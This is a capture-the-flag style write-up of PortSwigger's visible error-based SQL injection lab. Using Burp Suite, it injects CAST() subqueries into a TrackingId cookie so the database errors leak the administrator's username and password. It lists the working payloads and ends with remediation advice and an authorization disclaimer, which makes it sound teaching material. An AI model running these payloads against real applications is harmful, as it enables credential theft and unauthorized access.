# Visible Error-Based SQL Injection

## PortSwigger Web Security Academy

**Category:** SQL Injection  
**Lab:** Visible error-based SQL injection  
**Difficulty:** Practitioner  
**Status:** ✅ Solved

---

## Lab Description

This lab contains a SQL injection vulnerability in a tracking cookie.

The application uses the `TrackingId` cookie in a SQL query. The application also returns detailed database error messages when the SQL query is malformed.

By intentionally causing SQL errors, sensitive information from the database can be included in the error message.

The objective is to exploit this behavior and retrieve the administrator password.

---

## Objective

Exploit the visible error-based SQL injection vulnerability to retrieve the password of the `administrator` user and log in to the administrator account.

---

## Vulnerability

The application uses the `TrackingId` cookie directly in a SQL query without properly parameterizing the input.

A query can be conceptually represented as:

```sql
SELECT TrackingId
FROM TrackedUsers
WHERE TrackingId = '<TrackingId>'

Because the cookie value is controlled by the client, SQL syntax can be injected into the query.

The application also exposes verbose SQL error messages.

This combination allows an attacker to inject a query that deliberately causes a database conversion error and exposes the result of a subquery inside the error message.

Solution
Step 1: Identify the TrackingId Cookie

First, open the PortSwigger lab and browse the application.

Intercept a request using Burp Suite.

The request contains a cookie similar to:

Cookie: TrackingId=xyz

The TrackingId cookie is the injection point.

Step 2: Send the Request to Burp Repeater

Send the request to Burp Suite Repeater.

This allows the cookie value to be modified and the server response to be inspected.

The original cookie looks similar to:

TrackingId=xyz
Step 3: Trigger a SQL Error

Modify the cookie by adding a single quote:

xyz'

Send the request.

The application returns an SQL error.

This confirms that the TrackingId value is being incorporated into a SQL query.

The error message also provides information about the SQL query being executed.

Step 4: Confirm the SQL Injection

Add a comment sequence to terminate the query:

xyz'--

The -- comments out the remainder of the SQL statement.

The request can now be used to construct additional SQL expressions.

Exploiting the Error Message

The important part of this vulnerability is that we can intentionally cause a data-type conversion error.

The CAST() function can be used to convert a value from one data type to another.

For example:

CAST('test' AS int)

attempts to convert the string test into an integer.

This causes an error because test is not a valid integer.

A database error may therefore contain the value that was supplied to CAST().

This behavior can be abused to make the database reveal information.

Step 5: Confirm the Database Behavior

A payload can be constructed using:

' AND 1=CAST((SELECT 'a') AS int)--

Conceptually, the query becomes:

SELECT TrackingId
FROM TrackedUsers
WHERE TrackingId = ''
AND 1=CAST((SELECT 'a') AS int)--

The database attempts to convert the value a to an integer.

This generates an error containing the supplied value.

Step 6: Identify the Users Table

Next, query the users table.

The following payload can be used:

' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--

The subquery:

SELECT username
FROM users
LIMIT 1

returns the username of the first user.

The result is then passed to:

CAST(... AS int)

which causes a conversion error.

The error message reveals the username.

In this lab, the retrieved username is:

administrator

This confirms that the users table exists and contains the administrator account.

Step 7: Extract the Administrator Password

Now that the users table and administrator account have been identified, the same technique can be used to retrieve the password.

Use:

' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--

The database attempts to convert the administrator password into an integer.

Because the password is not a valid integer, the database generates an error.

The error message contains the password value.

The password can then be copied and used on the application's login page.

Step 8: Log In as Administrator

Navigate to the login page.

Enter:

Username: administrator
Password: <retrieved password>

Submit the login form.

The credentials retrieved through the SQL error allow authentication as the administrator.

The lab is then marked as solved.

Payloads Used
Trigger SQL Error
'
Comment Out the Remaining Query
'--
Test Error-Based SQL Injection
' AND 1=CAST((SELECT 'a') AS int)--
Retrieve Username
' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
Retrieve Password
' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
How the Exploit Works

The attack relies on three conditions:

User-controlled input is included in a SQL query.
The application returns detailed SQL error messages.
The database error reveals the value involved in a failed type conversion.

The basic attack flow is:

TrackingId Cookie
       ↓
SQL Injection
       ↓
Subquery retrieves data
       ↓
CAST() attempts invalid conversion
       ↓
Database generates an error
       ↓
Error message contains the data
       ↓
Sensitive information is revealed
Example

Suppose the database contains:

username = administrator
password = secret123

The following query:

SELECT password FROM users LIMIT 1

returns:

secret123

When the result is passed to:

CAST('secret123' AS int)

the database generates a conversion error.

The error may contain:

invalid input syntax for type integer: "secret123"

Therefore, the password is exposed through the error message.

Burp Suite Workflow
Browser
   ↓
Capture Request
   ↓
Identify TrackingId Cookie
   ↓
Send to Burp Repeater
   ↓
Trigger SQL Error
   ↓
Confirm SQL Injection
   ↓
Use CAST() to Trigger Conversion Error
   ↓
Query users Table
   ↓
Retrieve administrator Username
   ↓
Retrieve administrator Password
   ↓
Login as Administrator
   ↓
Lab Solved
Tools Used
Burp Suite
Burp Suite Repeater
Web Browser
PortSwigger Web Security Academy
Key Takeaways
SQL injection can occur in HTTP cookies, not only URL parameters or form inputs.
Verbose database errors can expose sensitive information.
Error-based SQL injection can turn database errors into an information disclosure channel.
The CAST() function can be abused to trigger type-conversion errors containing database values.
Sensitive information such as usernames and passwords should never be exposed through database error messages.
Applications should use parameterized queries or prepared statements to prevent SQL injection.
Production applications should also avoid exposing detailed database errors to users.
Remediation

The primary defense against SQL injection is the use of parameterized queries or prepared statements.

Instead of constructing SQL queries using string concatenation:

SELECT * FROM users
WHERE username = '<user_input>'

the application should use a parameterized query:

SELECT * FROM users
WHERE username = ?

The application should also:

Avoid exposing database error messages to users.
Log detailed errors internally.
Return generic error messages to clients.
Validate and handle user-controlled input appropriately.
Apply the principle of least privilege to database accounts.
Lab Status

Status: ✅ Solved

Vulnerability: Visible Error-Based SQL Injection

Injection Point: TrackingId cookie

Technique: SQL error-based data extraction

Impact: Sensitive database information disclosure

Disclaimer

This write-up was created for educational and authorized security testing purposes using the PortSwigger Web Security Academy lab environment.

Do not use these techniques against systems without explicit authorization.
